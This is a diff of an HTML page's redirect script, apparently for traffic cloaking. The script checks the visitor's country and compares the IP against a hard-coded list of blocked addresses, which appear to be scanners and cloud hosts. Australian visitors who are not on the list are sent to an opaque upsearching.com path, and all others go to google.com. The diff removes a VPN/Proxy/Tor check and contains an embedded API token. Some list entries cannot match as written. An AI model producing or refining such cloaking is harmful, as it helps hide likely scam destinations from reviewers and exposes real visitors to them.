@@ -7,6 +7,7 @@
   <script>
     const allowedCountry = 'AU';
     const token = "5913d8fa347073";
+
     const blockedIPs = [
       "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
       "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
@@ -16,8 +17,8 @@
       "154.16.81.84", "54.156.251.192", "34.235.48.77", "149.154.161.", "212.143.94.254",
       "212.6.82.", "40.80.158.10", "89.248.171.", "85.208.139.205", "138.199.59.",
       "128.90.177.209", "128.90.63.191", "74.80.181.154", "212.102.63.", "82.102.31.156",
-      "31.217.248.", "159.148.128.163", "85.254.40.226", "173.239.203.152" "35.90.31.108",
-      "44.243.20.38" "5.62.21.xxx", "35.241.237.xxx", "54.156.251.192",
+      "31.217.248.", "159.148.128.163", "85.254.40.226", "173.239.203.152", "35.90.31.108",
+      "44.243.20.38", "5.62.21.xxx", "35.241.237.xxx", "54.156.251.192"
     ];
 
     async function checkAccess() {
@@ -31,30 +32,11 @@
         console.log("User IP:", ip);
         console.log("Country:", country);
 
-        // Check if IP is blocked
         const isBlocked = blockedIPs.some(blocked => {
-          if (blocked.endsWith('.xxx')) {
-            return ip.startsWith(blocked.replace('.xxx', ''));
-          } else {
-            return ip === blocked;
-          }
+          return blocked.endsWith('.xxx') ? ip.startsWith(blocked.replace('.xxx', '')) : ip === blocked;
         });
 
-        if (isBlocked) {
-          console.warn("Blocked IP detected:", ip);
-          window.location.href = "https://google.com";
-          return;
-        }
-
-        // Check for proxy/VPN/Tor
-        const privacyResponse = await fetch(`https://ipinfo.io/${ip}/privacy?token=${token}`);
-        const privacyData = await privacyResponse.json();
-
-        const isProxy = privacyData.proxy;
-        const isVPN = privacyData.vpn;
-        const isTor = privacyData.tor;
-
-        if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
+        if (country === allowedCountry && !isBlocked) {
           window.location.href = "https://www.upsearching.com/DZRZX6W/SS8GLPH/";
         } else {
           window.location.href = "https://google.com";
@@ -69,6 +51,4 @@
     window.onload = checkAccess;
   </script>
 </head>
-<body>
-</body>
 </html>
